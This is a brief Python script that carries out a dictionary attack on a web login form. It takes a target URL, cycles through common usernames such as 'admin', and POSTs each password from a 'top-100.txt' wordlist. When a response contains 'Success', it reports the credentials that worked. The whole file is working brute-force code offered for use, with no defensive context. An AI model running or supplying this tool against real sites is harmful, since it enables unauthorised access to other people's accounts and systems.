import requests
import sys

target = input('Type your target link: ')
# You can change list of usernames
usernames = ['admin','user','test']
# You can make this text file if you want 
passwords = 'top-100.txt'
needle = 'Success'

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password =>{}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid Password: {} found for user: {}".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\t [>>>>>] No passwords found for {}".format(username))
